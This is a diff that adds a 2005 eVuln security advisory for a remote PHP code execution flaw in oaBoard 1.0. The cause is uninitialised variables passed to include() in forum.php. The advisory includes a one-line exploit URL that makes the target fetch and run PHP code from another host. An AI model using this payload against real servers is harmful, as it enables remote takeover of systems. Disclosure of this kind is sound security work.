@@ -1,0 +1,37 @@
+New eVuln Advisory:
+oaBoard PHP Code Execution
+
+--------------------Summary----------------
+
+Software: oaBoard
+Versions: 1.0
+Critical Level: Dangerous
+Type: PHP Code Execution
+Class: Remote
+Status: Unpatched
+Exploit: Available
+Solution: Not Available
+Discovered by: Aliaksandr Hartsuyeu (alex@evuln.com)
+Published: 2005.12.29
+eVuln ID: EV0003
+
+-----------------Description--------------
+Vulnerable scripts:
+forum.php
+
+Variables $inc and $inc_stat isn't initialized before being used in the include(). This can be used to execute arbitrary PHP code.
+
+Condition: register_globals = on
+
+--------------Exploit---------------------
+http://host/oaboard_en/forum.php?inc=http://anotherhost/code.php
+
+
+--------------Solution---------------------
+No Patch available.
+
+--------------Credit---------------------
+Original Advisory:
+http://evuln.com/vulns/3/summary.html
+
+Discovered by: Aliaksandr Hartsuyeu (alex@evuln.com)
